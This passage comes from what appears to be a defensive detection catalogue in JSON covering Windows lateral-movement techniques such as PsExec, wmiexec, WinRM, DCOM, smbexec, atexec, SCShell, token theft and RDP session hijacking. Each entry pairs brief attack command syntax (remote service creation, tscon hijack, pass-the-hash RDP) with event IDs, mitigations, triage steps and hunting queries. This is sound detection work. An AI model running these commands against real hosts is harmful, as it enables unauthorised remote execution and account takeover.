LogonType3. Sysmon 17/18 on named pipes (psexecsvc, RemComSvc).","events":"7045, 4697, 5145, 4624(Type3), 5140, Sysmon 17/18","mitigate":"Restrict access to admin shares (ADMIN$/C$), enforce SMB signing, block workstation-to-workstation 445 with the host firewall. Prevent local admin reuse with LAPS. Correlate service creation + temp executable in EDR. Restrict network logon for privileged accounts.","triage":"On the target inspect System log 7045/4697 for a service named PSEXESVC or random with ImagePath pointing to a temp file in ADMIN$, and correlate the preceding 4624 LogonType3, 5145 (share=ADMIN$, RelativeTargetName=the binary), 5140, and Sysmon 17/18 named pipes (psexecsvc/RemComSvc). Source-to-ADMIN$ write, then 7045, then service start and child process for the same account within seconds is a true positive. SCCM/asset-mgmt/backup/monitoring agents that routinely install a fixed-name service from a known distribution server during an approved window lean benign.","hunt":[{"plat":"MDE","t":"PsExec/RemCom named-pipe creation = black / occasional legit Sysinternals only = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"NamedPipeEvent\"\n| extend PipeName = tostring(AdditionalFields.PipeName)\n| where PipeName has_any (\"psexesvc\",\"PSEXESVC\",\"RemCom\",\"paexec\",\"csexec\")\n| summarize hits=count(), pipes=make_set(PipeName,10) by DeviceName, InitiatingProcessFileName, bin(Timestamp,1h)\n| where hits > 0"},{"plat":"Sentinel","t":"PSEXESVC.exe-style exe write to ADMIN$ via 5145 = black / normal admin-share file copy = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"ADMIN$\"\n| where RelativeTargetName has_any (\"PSEXESVC\",\"-stdin\",\"-stdout\",\"-stderr\") or RelativeTargetName endswith \".exe\"\n| summarize hits=count(), files=make_set(RelativeTargetName,10) by Computer, Account, IpAddress, bin(TimeGenerated,10m)\n| where hits > 0"},{"plat":"Sentinel","t":"Random/PSEXESVC new service install (4697) = black / known operational service = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4697\n| where ServiceName has_any (\"PSEXESVC\",\"PAExec\",\"RemCom\") or ServiceName matches regex \"^[A-Za-z0-9]{8,}$\"\n| summarize n=count(), svcs=make_set(ServiceName,20) by Computer, SubjectUserName, bin(TimeGenerated,1h)\n| where n > 0"}],"huntcs":[{"plat":"Event Search","t":"Service install pointing at PSEXESVC or ADMIN$ temp = malicious / legit MSI service = benign","q":"event_simpleName=CreateService (ServiceImagePath=\"*PSEXESVC*\" OR ServiceImagePath=\"*\\\\ADMIN$\\\\*\" OR ServiceImagePath=\"*\\\\Windows\\\\PSEXESVC*\")\n| eval svc=ServiceDisplayName\n| stats count values(ServiceImagePath) as path by ComputerName, svc\n| sort - count"},{"plat":"LogScale","t":"psexesvc/RemComSvc named pipe = PsExec-family exec = malicious","q":"#event_simpleName=NamedPipeCreate\n| PipeName=/psexesvc|remcom|RemComSvc/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count())\n| sort(count, order=desc)"}]},{"name":"WMI Lateral Movement (wmiexec)","aka":"wmiexec.py / Invoke-WmiMethod / wmic process call create","phase":"lateral","group":"Lateral Movement","mitre":"T1047, T1021.003","cve":"","sev":"High","summary":"Spawn a remote process via WMI over DCOM/RPC (135 + dynamic ports) to run commands without writing files to disk.","how":"Requires admin rights and WMI (135/DCOM) reachability. Execute via impacket wmiexec.py domain/user@target (semi-interactive, output written to an SMB share), wmic /node:target process call create \"cmd\", PowerShell Invoke-WmiMethod -Class Win32_Process -Name Create, or Invoke-CimMethod. Spawns the process via Win32_Process without creating a service, leaving fewer artifacts than PsExec. Supports PtH (-hashes).","tools":"impacket wmiexec.py, wmic, PowerShell(Invoke-WmiMethod/CimMethod), NetExec --exec-method wmiexec, wmiexec-Pro","detect":"cmd.exe/powershell.exe spawned with wmiprvse.exe (WmiPrvSE) as parent (Sysmon 1 ParentImage=WmiPrvSE.exe), remote Win32_Process calls. WMI activity immediately after 4624 LogonType3, writes to ADMIN$/C$ for output (5145). WMI-Activity Operational log.","events":"4624(Type3), Sysmon 1(親WmiPrvSE.exe), Microsoft-Windows-WMI-Activity/Operational, 5145","mitigate":"Restrict host-to-host DCOM/WMI (135 + high ports) with the firewall; separate WMI per Tier. Detect command-shell spawns under WmiPrvSE in EDR. Use LAPS/credential protection and minimize network logon for privileged accounts.","triage":"On the target confirm Sysmon EID1 child cmd.exe/powershell.exe with ParentImage=WmiPrvSE.exe, and correlate Microsoft-Windows-WMI-Activity/Operational remote Win32_Process Create, the preceding 4624 LogonType3, and 5145 writes to ADMIN$/C$ for output. Source DCOM(135) connection then a WmiPrvSE child process then an output file written to the share for the same account at the same time is a true positive. SCCM/monitoring/inventory that periodically runs scripts via Win32_Process from a known management server with fixed commands during business hours leans benign.","hunt":[{"plat":"MDE","t":"cmd/powershell spawned by WmiPrvSE.exe = black / app-driven legit WMI = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"wmiprvse.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"},{"plat":"Sentinel","t":"wmiexec output redirect (__-style temp file on ADMIN$) = black / normal ops = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has_any (\"ADMIN$\",\"C$\")\n| where RelativeTargetName startswith \"__\" or RelativeTargetName has_any (\".tmp\",\"Temp\\\\__\")\n| summarize hits=count(), files=make_set(RelativeTargetName,10) by Computer, Account, IpAddress, bin(TimeGenerated,10m)\n| where hits > 0"}],"huntcs":[{"plat":"LogScale","t":"WmiPrvSE-spawned cmd/psh with ADMIN$ output redirect = wmiexec = malicious","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/wmiprvse\\.exe/i\n| FileName=/cmd\\.exe|powershell\\.exe/i\n| CommandLine=/\\/Q\\s+\\/c|127\\.0\\.0\\.1\\\\ADMIN\\$|\\\\\\\\127\\.0\\.0\\.1|__\\d|Temp\\\\__/i\n| groupBy([ComputerName, UserName, CommandLine], function=count())"}]},{"name":"WinRM Lateral Movement (evil-winrm / PowerShell Remoting)","aka":"PSRemoting / WS-Management / Enter-PSSession","phase":"lateral","group":"Lateral Movement","mitre":"T1021.006, T1059.001","cve":"","sev":"High","summary":"Establish a remote PowerShell session over WinRM (5985/5986) WS-Management and run commands.","how":"Requires WinRM enabled on the target, Remote Management Users/admin rights, and 5985/5986 reachability. Execute via evil-winrm -i target -u user -p pass (or PtH: -H hash, Kerberos: -r realm), PowerShell Enter-PSSession / Invoke-Command -ComputerName target -ScriptBlock, or the NetExec winrm module. Supports fileless execution, upload/download, and AMSI bypass.","tools":"evil-winrm, PowerShell Remoting(Invoke-Command/Enter-PSSession), NetExec winrm, impacket各種の-k連携","detect":"Spawn of wsmprovhost.exe (WinRM host) with commands executed as its children (Sysmon 1 ParentImage=wsmprovhost.exe). WinRM/Operational log, 4624 LogonType3, obfuscated commands in PowerShell ScriptBlock logs (4104). Anomalous internal connections to 5985/5986.","events":"4624(Type3), Sysmon 1(親wsmprovhost.exe), Microsoft-Windows-WinRM/Operational, 4103/4104","mitigate":"Disable WinRM on hosts that don't need it; restrict WinRM sources via IPSec or TrustedHosts. Enable PowerShell ScriptBlock/module logging and AMSI. Limit operations with JEA (Just Enough Administration). Apply Tier separation and network segmentation.","triage":"On the target confirm Sysmon EID1 child processes with ParentImage=wsmprovhost.exe, and review Microsoft-Windows-WinRM/Operational, 4624 LogonType3, and PowerShell 4103/4104 for obfuscation, AMSI bypass, or download cradles. Source-to-5985/5986 connection, then a wsmprovhost child process, then an obfuscated ScriptBlock for the same account in sequence is a true positive. Ansible/DSC/monitoring/config-mgmt that routinely runs known scripts over WinRM from a management server with clear-text operational scripts during business hours leans benign.","hunt":[{"plat":"MDE","t":"Interactive/obfuscated commands under wsmprovhost.exe = black / legit PSRemoting scripts = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"wsmprovhost.exe\"\n| where FileName !in~ (\"conhost.exe\")\n| summarize n=count(), cmds=make_set(ProcessCommandLine,10) by DeviceName, AccountName, bin(Timestamp,1h)\n| where n > 0"},{"plat":"MDE","t":"Non-WinRM process fanning out to 5985/5986 across hosts = black / winrshost legit = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort in (5985,5986)\n| where InitiatingProcessFileName !in~ (\"winrshost.exe\",\"svchost.exe\",\"WsmProvHost.exe\")\n| summarize targets=dcount(RemoteIP), hosts=make_set(RemoteIP,20) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName\n| where targets > 3"}],"huntcs":[{"plat":"LogScale","t":"wsmprovhost-spawned shell/obfuscated cmd = evil-winrm/PSRemoting = malicious","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/wsmprovhost\\.exe/i\n| FileName=/cmd\\.exe|powershell\\.exe|pwsh\\.exe|conhost\\.exe/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"},{"plat":"Event Search","t":"Fan-in 5985/5986 accepts (LocalPort) across hosts = WinRM lateral = malicious","q":"event_simpleName=NetworkReceiveAcceptIP4 (LocalPort=5985 OR LocalPort=5986)\n| stats dc(RemoteAddressIP4) as sources count by ComputerName\n| where sources > 3\n| sort - sources"}]},{"name":"DCOM Lateral Movement (dcomexec)","aka":"MMC20.Application / ShellWindows / ShellBrowserWindow / ExcelDDE / Outlook.Application","phase":"lateral","group":"Lateral Movement","mitre":"T1021.003","cve":"","sev":"High","summary":"Remotely invoke exposed methods of DCOM objects (ExecuteShellCommand, etc.) for indirect command execution.","how":"Requires admin rights and DCOM (135) reachability. Multiple variants: PowerShell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target')).Document.ActiveView.ExecuteShellCommand(...), ShellWindows/ShellBrowserWindow (by CLSID) Navigate/Document.Application.ShellExecute, Excel.Application DDEInitiate, Outlook.Application CreateObject, etc. impacket dcomexec.py -object MMC20|ShellWindows|ShellBrowserWindow. Execution occurs as a child of the DCOM server process, so it is used for detection evasion.","tools":"impacket dcomexec.py, PowerShell(CreateInstance/GetTypeFromProgID), Invoke-DCOM.ps1, SharpDCOM","detect":"Anomalous cmd.exe/powershell.exe spawned with a DCOM server such as mmc.exe/explorer.exe/excel.exe as parent (Sysmon 1 anomalous ParentImage). Correlation of DCOM activation over 135 with an immediately following process spawn, 4624 LogonType3. DCOM launch events (10028, etc.).","events":"4624(Type3), Sysmon 1(親mmc/explorer/excel等), 10028(DistributedCOM), 5145","mitigate":"Harden DCOM launch/access permissions (dcomcnfg); restrict host-to-host port 135. Detect shell spawns from Office apps or mmc.exe in EDR. Restrict DCOM permissions on attackable ProgIDs/CLSIDs and disable unnecessary COM servers.","triage":"On the target confirm Sysmon EID1 anomalous cmd.exe/powershell.exe children with ParentImage of a DCOM server (mmc.exe/explorer.exe/excel.exe), and correlate Microsoft-Windows-DistributedCOM 10028, the preceding 4624 LogonType3, and 5145. Source DCOM activation over 135 then a child process spawned by that DCOM server for the same account within seconds is a true positive. A user genuinely operating Excel/MMC interactively, or legitimate COM+ apps/admin consoles where the source is the user's normal workstation during business hours, leans benign.","hunt":[{"plat":"MDE","t":"cmd/powershell parented by DCOM servers (mmc/explorer/office) = black / user-driven launch = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName in~ (\"mmc.exe\",\"explorer.exe\",\"excel.exe\",\"winword.exe\",\"outlook.exe\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"rundll32.exe\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Remote 135 activation preceding DCOM-server-spawned shell = black correlation / local-only = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 135 and ActionType == \"InboundConnectionAccepted\"\n| summarize conns=count(), sources=make_set(RemoteIP,20) by DeviceName, bin(Timestamp,10m)\n| where conns > 0"}],"huntcs":[{"plat":"LogScale","t":"cmd/psh spawned by mmc/explorer/excel DCOM server = dcomexec = malicious","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/mmc\\.exe|explorer\\.exe|excel\\.exe|winword\\.exe|outlook\\.exe|mspub\\.exe/i\n| FileName=/cmd\\.exe|powershell\\.exe|pwsh\\.exe|rundll32\\.exe/i\n| groupBy([ComputerName, ParentBaseFileName, FileName, CommandLine], function=count())"}]},{"name":"SMBexec (semi-interactive shell)","aka":"impacket smbexec.py / CME smbexec","phase":"lateral","group":"Lateral Movement","mitre":"T1021.002, T1569.002","cve":"","sev":"High","summary":"A more fileless technique: create a temporary service over SMB, run commands via cmd, and retrieve output through a shared file.","how":"Requires local admin and SMB (445). impacket smbexec.py domain/user:pass@target creates a temporary service for each command execution, runs the command via %COMSPEC%, writes output to a share (typically C$ Temp), and reads it back over SMB. Differs from PsExec in that it places no binary on disk. Supports PtH (-hashes). Also usable via NetExec --exec-method smbexec.","tools":"impacket smbexec.py, NetExec --exec-method smbexec","detect":"Repeated creation/deletion of temporary services in a short window (7045/7034/7036), ImagePath starting with a %COMSPEC% /Q /c echo ... string, share writes of temp files like __output/BTOBTO (5145). cmd.exe spawned with services.exe as parent.","events":"7045, 7036, 4697, 5145, 4624(Type3), Sysmon 1(親services.exe)","mitigate":"Restrict admin share access, SMB signing, block 445 with the host firewall, LAPS. Detect service ImagePaths containing %COMSPEC% and repetitive service creation in EDR. Minimize network logon for privileged accounts.","triage":"On the target confirm repeated short-lived temporary service create/delete (7045/7034/7036, 4697) in the System log, ImagePath beginning with %COMSPEC% /Q /c echo ..., Sysmon EID1 cmd.exe with ParentImage=services.exe, and 5145 writes of temp files like __output/BTOBTO. A repeating pattern where a service is spawned and immediately deleted per command with output written to the share, chained to 4624 LogonType3 for the same account, is a true positive. A legitimate one-off service reconfiguration/patch or a steady-state monitoring agent leans benign.","hunt":[{"plat":"MDE","t":"cmd /Q /c echo ... parented by services.exe = black (smbexec) / legit service exec = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"services.exe\"\n| where FileName =~ \"cmd.exe\"\n| where ProcessCommandLine has_all (\"/Q\",\"/c\") and ProcessCommandLine has \"echo\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine"},{"plat":"Sentinel","t":"Repeated __output/BTOBTO temp share writes (5145) in short window = black / one-off = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName has_any (\"__output\",\"BTOBTO\",\"execute.bat\")\n| summarize hits=count() by Computer, Account, IpAddress, bin(TimeGenerated,10m)\n| where hits > 1"}],"huntcs":[{"plat":"LogScale","t":"services.exe-spawned cmd with /Q /c echo + __output = smbexec = malicious","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/services\\.exe/i\n| FileName=/cmd\\.exe/i\n| CommandLine=/\\/Q\\s+\\/c|echo\\s|__output|BTOBTO|\\\\Temp\\\\__/i\n| groupBy([ComputerName, UserName, CommandLine], function=count())"}]},{"name":"Lateral Movement via Scheduled Tasks (atexec)","aka":"impacket atexec.py / schtasks /s / ATSVC","phase":"lateral","group":"Lateral Movement","mitre":"T1053.005, T1021.002","cve":"","sev":"High","summary":"Create and immediately run a scheduled task on a remote host to execute commands.","how":"Requires admin rights and RPC/SMB (135/445, Task Scheduler ATSVC/ITaskSchedulerService pipe) reachability. schtasks /create /s target /tn <name> /tr \"cmd\" /sc once /st ... /ru SYSTEM followed by /run, or impacket atexec.py domain/user@target \"command\" (create task -> run -> collect output -> delete). Supports PtH/Kerberos. Abused to run tasks with SYSTEM privileges.","tools":"impacket atexec.py, schtasks.exe(/s), NetExec --exec-method atexec, PowerShell ScheduledTasks module","detect":"Remotely created tasks in the Task Scheduler Operational log (EventID 106 register/140 update/141 delete/200 execute), 4698 (task creation)/4702 (update), short-lived tasks run and deleted immediately after creation. Correlation with 4624 LogonType3. cmd/powershell spawned with TaskEngine as parent.","events":"4698, 4699, 4702, 4700/4701, Microsoft-Windows-TaskScheduler/Operational(106/140/141/200/201), 4624","mitigate":"Restrict remote task creation by firewall/permissions; control remote access to the Task Scheduler service. Enable auditing of task creation/deletion and correlate in SIEM. LAPS/Tier separation, restrict network logon for privileged accounts.","triage":"On the target confirm Microsoft-Windows-TaskScheduler/Operational (106 register/140 update/141 delete/200/201 run) and 4698/4699/4702 for a short-lived task created, immediately run, then deleted, and correlate Sysmon EID1 cmd.exe/powershell.exe with a TaskEngine/svchost parent plus the preceding 4624 LogonType3. Remote source, then 106 create, then 200 run, then 141 delete for the same account within seconds with a cmd/PowerShell action is a true positive. SCCM/backup/patch management that creates and keeps a known persistent task from a management server during business hours with naming-convention compliance leans benign.","hunt":[{"plat":"Sentinel","t":"Short-lived task created then deleted within 5m (4698/4699 pair) = black (atexec) / persistent task = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4698,4699)\n| summarize created=countif(EventID==4698), deleted=countif(EventID==4699), span=max(TimeGenerated)-min(TimeGenerated) by Computer, SubjectUserName, bin(TimeGenerated,15m)\n| where created > 0 and deleted > 0 and span < 5m"},{"plat":"MDE","t":"cmd echo-output parented by scheduler host (svchost/taskeng) = black / legit scheduled run = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName in~ (\"svchost.exe\",\"taskeng.exe\",\"taskhostw.exe\")\n| where FileName =~ \"cmd.exe\"\n| where ProcessCommandLine has \"echo\" and ProcessCommandLine has_any (\"> \\\\\",\"Temp\\\\\",\".tmp\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"LogScale","t":"Task registered with cmd /C + output redirect = atexec = malicious","q":"#event_simpleName=ScheduledTaskRegistered\n| TaskExecCommand=/cmd(\\.exe)?\\s+\\/C|powershell|>\\s*\\\\?\\\\?\\S+\\\\Temp|__|\\\\Windows\\\\Temp/i\n| groupBy([ComputerName, TaskName, TaskAuthor, TaskExecCommand], function=count())\n| sort(count, order=desc)"},{"plat":"Event Search","t":"cmd/psh under taskeng/svchost = remote task exec = malicious","q":"event_simpleName=ProcessRollup2 (ParentBaseFileName=\"taskeng.exe\" OR ParentBaseFileName=\"svchost.exe\") (FileName=\"cmd.exe\" OR FileName=\"powershell.exe\")\n| stats count by ComputerName, ParentBaseFileName, CommandLine"}]},{"name":"Lateral Movement via Service Creation (services / SCShell)","aka":"sc create / impacket services.py / SCShell (ChangeServiceConfig)","phase":"lateral","group":"Lateral Movement","mitre":"T1543.003, T1569.002, T1021.002","cve":"","sev":"High","summary":"Use the remote SCM (svcctl) to create a new service, or rewrite an existing service's binary path, to execute arbitrary code.","how":"Requires local admin and RPC/SMB (445, svcctl pipe). sc \\\\target create svc binPath= \"cmd /c ...\" && sc \\\\target start svc, or create/start/delete via impacket services.py. SCShell is a fully fileless technique that places no new binary, temporarily rewriting an existing service's binPath with ChangeServiceConfigW and starting it (supports PtH/Kerberos). Runs as SYSTEM.","tools":"sc.exe, impacket services.py, SCShell, NetExec, PowerShell New-Service","detect":"7045 (new service) or ImagePath change of an existing service (4657 registry, 7040 start-type change, 4697). binPath containing cmd/powershell/suspicious paths. SCShell's artifact is the temporary ImagePath alteration and immediate restoration of an existing service. Correlation with 4624 LogonType3.","events":"7045, 4697, 4657(Services レジストリ), 7040, 4624(Type3)","mitigate":"Restrict remote SCM access and service-config change rights; audit the ImagePath registry of critical services (4657). Detect shell spawns from services.exe children in EDR. LAPS/Tier separation, host-to-host 445 restrictions.","triage":"On the target confirm System log 7045(new)/4697, or 4657 (HKLM\\SYSTEM\\...\\Services registry) and 7040 (start-type change) indicating an ImagePath change on an existing service, and look for binPath pointing to cmd/powershell/suspicious paths, or SCShell's temporary ImagePath rewrite then immediate restore. A remote source (4624 LogonType3), then service create/modify via svcctl, then a SYSTEM child process for the same account at the same time is a true positive. Software deployment/driver updates/monitoring agents installing a fixed-name service with a legitimate binPath from a known server during business hours leans benign.","hunt":[{"plat":"MDE","t":"Services ImagePath rewritten to cmd/powershell/share path = black (SCShell revert also traces) / legit update = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"\\Services\\\" and RegistryValueName =~ \"ImagePath\"\n| where RegistryValueData has_any (\"cmd.exe\",\"powershell\",\"%COMSPEC%\",\"\\\\ADMIN$\",\"\\\\\\\\\")\n| project Timestamp, DeviceName, RegistryKey, PreviousRegistryValueData, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"New service install (4697) tied to remote logon principal = black / local legit install = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4697\n| where ServiceName matches regex \"^[A-Za-z0-9]{6,}$\" or ServiceName has_any (\"SCShell\",\"services\")\n| summarize n=count(), svcs=make_set(ServiceName,20) by Computer, SubjectUserName, bin(TimeGenerated,1h)\n| where n > 0"}],"huntcs":[{"plat":"Event Search","t":"Service create with cmd/psh/odd binPath = services.py/SCShell = malicious","q":"event_simpleName=CreateService (ServiceImagePath=\"*cmd*\" OR ServiceImagePath=\"*powershell*\" OR ServiceImagePath=\"*%COMSPEC%*\" OR ServiceImagePath=\"*\\\\Temp\\\\*\" OR ServiceImagePath=\"*rundll32*\")\n| stats count by ComputerName, ServiceDisplayName, ServiceImagePath\n| sort - count"},{"plat":"LogScale","t":"Services ImagePath registry rewrite = SCShell temp change = malicious","q":"#event_simpleName=RegSystemConfigValueUpdate\n| RegObjectName=/\\\\Services\\\\/i\n| RegValueName=/ImagePath/i\n| RegStringValue=/cmd|powershell|rundll32|\\\\Temp\\\\|%COMSPEC%/i\n| groupBy([ComputerName, RegObjectName, RegStringValue], function=count())"}]},{"name":"Token Impersonation (Token Theft)","aka":"incognito / mimikatz token::elevate / Potato family / MakeToken","phase":"lateral","group":"Lateral Movement","mitre":"T1134.001, T1134.002, T1134.003","cve":"","sev":"High","summary":"Steal and duplicate the access token of an existing process/thread to impersonate that user for lateral movement or account switching.","how":"Requires SeImpersonate/SeAssignPrimaryToken privileges or admin rights, plus a process holding the target user's token. Meterpreter incognito (list_tokens/impersonate_token), mimikatz token::list / token::elevate, Cobalt Strike steal_token, Rubeus/PowerShell MakeToken or the ImpersonateLoggedOnUser API. Steal a Domain Admin's token from a server where they are logged on and access network resources via delegation. Potato family (JuicyPotato/PrintSpoofer/RoguePotato) escalates from SeImpersonate to SYSTEM.","tools":"Meterpreter incognito, mimikatz(token::*), Cobalt Strike, PrintSpoofer/JuicyPotato, Invoke-TokenManipulation.ps1","detect":"Anomalous 4624 LogonType9 (NewCredentials, equivalent to runas /netonly) or 4648 (explicit-credential logon), unexpected token duplication from a privileged process. SeImpersonate abuse is detected via SYSTEM escalation over named pipes/RPC (Sysmon 17/18, a sudden jump in process integrity).","events":"4624(LogonType 9), 4648, 4672, Sysmon 17/18, 4696","mitigate":"Grant SeImpersonate/SeAssignPrimaryToken to the minimum set of service accounts. Do not let privileged accounts log on to low-trust hosts (Tier separation). Credential Guard, isolation of admin servers. Monitor token-manipulation APIs in EDR.","triage":"On the target confirm anomalous 4624 LogonType9(NewCredentials) and 4648(explicit credentials), 4672 privilege assignment, and 4696 (primary token assigned to a process), and for SeImpersonate/Potato abuse correlate Sysmon 17/18 named pipes with an integrity jump to SYSTEM. Unexpected token duplication from a privileged process then network access under a different account context, or a non-privileged process suddenly spawning a SYSTEM child via pipe/RPC, is a true positive. Legitimate admin use of runas /netonly, a known app that routinely uses LogonType9 for a service, or PAW activity during business hours leans benign.","hunt":[{"plat":"Sentinel","t":"LogonType 9 (NewCredentials/runas-netonly) clustered on one principal = black / occasional admin tool = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 9\n| summarize n=count(), targets=make_set(TargetUserName,20) by Computer, SubjectUserName, bin(TimeGenerated,1h)\n| where n > 3"},{"plat":"MDE","t":"SYSTEM-integrity process spawned by non-system parent = black (Potato SeImpersonate) / legit service = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessIntegrityLevel =~ \"System\"\n| where InitiatingProcessFileName !in~ (\"services.exe\",\"wininit.exe\",\"lsass.exe\",\"svchost.exe\",\"smss.exe\",\"csrss.exe\",\"winlogon.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, ProcessIntegrityLevel, ProcessTokenElevation"}],"huntcs":[{"plat":"Event Search","t":"Spikes of LogonType 9 (NewCredentials) = token impersonation = malicious","q":"event_simpleName=UserLogon LogonType=9\n| stats count dc(UserName) as users by ComputerName, UserName\n| where count > 2\n| sort - count"},{"plat":"LogScale","t":"Potato-style impersonation pipe + integrity jump = SeImpersonate abuse = malicious","q":"#event_simpleName=NamedPipeCreate\n| PipeName=/RoguePotato|\\\\pipe\\\\[0-9a-f]{8,}|epmapper|lsarpc\\\\|\\\\pipe\\\\srvsvc.*\\$/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count())"}]},{"name":"RDP Session Hijack (tscon)","aka":"tscon session hijack / RDP shadow / unauthenticated session takeover from SYSTEM","phase":"lateral","group":"Lateral Movement","mitre":"T1563.002, T1021.001","cve":"","sev":"High","summary":"Connect to another user's existing RDP/console session with tscon under SYSTEM privileges to hijack their desktop without authentication.","how":"Requires local SYSTEM privileges (or SeTcbPrivilege). After confirming the target session ID with query user, running tscon <sessionID> /dest:<own session> in a SYSTEM context takes over another user's disconnected/connected session without a password. Elevate to SYSTEM via sc create sesshijack binpath=\"cmd /k tscon ...\" or PsExec -s. RDP Shadowing (shadow /control) and PtH RDP via mstsc /restrictedadmin are related variants.","tools":"tscon.exe(+query user), sc/PsExec -s, RDP Shadow(mstsc /shadow), SharpRDP, mstsc /restrictedadmin","detect":"Session reconnection in Terminal Services operational logs (4778 reconnect/4779 disconnect), tscon.exe execution, session connections by SYSTEM, query user/quser execution. Unexpected session ID switches or ownership changes of console/RDP sessions.","events":"4778, 4779, 4624(LogonType 10/7), 4634, 1149(TerminalServices-RemoteConnectionManager), Sysmon 1(tscon.exe)","mitigate":"Restrict admin access to RDP hosts with MFA, enforce Network Level Authentication (NLA), and apply auto-logoff of idle sessions / delete-disconnected-session policies. Require user consent for RDP Shadowing. Avoid privileged use of shared RDP servers and apply Tier separation.","triage":"On the target confirm Security log 4778(reconnect)/4779(disconnect), Sysmon EID1 tscon.exe (parent an elevated-to-SYSTEM cmd/services.exe) and query user/quser, and correlate TerminalServices-RemoteConnectionManager 1149 and 4624 LogonType10/7. Connecting to another user's session ID without a password from a SYSTEM context (4778 shows an ownership change), chained to SYSTEM elevation via sc create/PsExec -s, is a true positive. An approved help-desk RDP Shadow (shadow /control), a user's own normal reconnect, or an admin's intentional session transfer leans benign.","hunt":[{"plat":"MDE","t":"tscon.exe run by SYSTEM/admin attaching to another session = black (RDP hijack) / legit remote assist = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"tscon.exe\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"Session reconnect (4778) by unexpected principal = black / owner reconnect = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4778,4779)\n| summarize reconnects=countif(EventID==4778), disconnects=countif(EventID==4779) by Computer, Account, IpAddress, bin(TimeGenerated,15m)\n| where reconnects > 0"}],"huntcs":[{"plat":"LogScale","t":"tscon.exe with dest to another session = RDP session hijack = malicious","q":"#event_simpleName=ProcessRollup2\n| FileName=/tscon\\.exe/i OR CommandLine=/tscon.*\\/dest:|tscon\\s+\\d+/i\n| groupBy([ComputerName, UserName, ParentBaseFileName, CommandLine], function=count())\n| sort(count, order=desc)"}]},{"name":"Lateral Movement via RDP / Restricted Admin & PtH-over-RDP","aka":"mstsc /restrictedadmin / xfreerdp /pth / SharpRDP","phase":"lateral","group":"Lateral Movement","mitre":"T1021.001, T1550.002","cve":"","sev":"High","summary":"Move laterally via interactive RDP logon (3389). Restricted Admin mode allows RDP authentication with only a hash (PtH over RDP).","how":"Requires 3389 reachability and interactive logon rights on the target (Remote Desktop Users/admin). Normally a credential logon via mstsc. If Restricted Admin is enabled, xfreerdp /u:user /pth:<NThash> /v:target or mstsc /restrictedadmin allows PtH logon without a password (user credentials are not delegated to or left on the target; subsequent network authentication runs in the target machine's computer-account context, so user-credential reuse = double hop is not possible). SharpRDP executes commands over RDP without an interactive GUI.","tools":"mstsc(/restrictedadmin), xfreerdp(/pth), SharpRDP, rdesktop, Cobalt Strike","detect":"Frequent 4624 LogonType10 (RemoteInteractive) for admin accounts, chained RDP across multiple hosts, 1149 connection events, Restricted Admin logon (LogonType3 + specific flags). Lateral 3389 connections from a pivot.","events":"4624(LogonType 10/3), 4778/4779, 1149, 21/24/25(TerminalServices-LocalSessionManager)","mitigate":"Limit RDP to jump hosts and restrict 3389 at the network, NLA/MFA. Evaluate the need for Restricted Admin and disable if unnecessary; if needed, manage delegation risk. Deploy Remote Credential Guard and apply Tier separation for privileged accounts.","triage":"On the target confirm frequent 4624 LogonType10(RemoteInteractive) for admin accounts, Restricted Admin logons (LogonType3 plus specific flags), 1149, and TerminalServices-LocalSessionManager 21/24/25, and correlate RDP chaining from one pivot to multiple hosts in a short window. The same admin making lateral 3389 connections to several hosts with LogonType10/3 and no interactive password-entry process (xfreerdp /pth style) chained together is a true positive. Normal admin RDP via a jump server/PAW, a one-off help-desk RDP, or expected-path activity during business hours leans 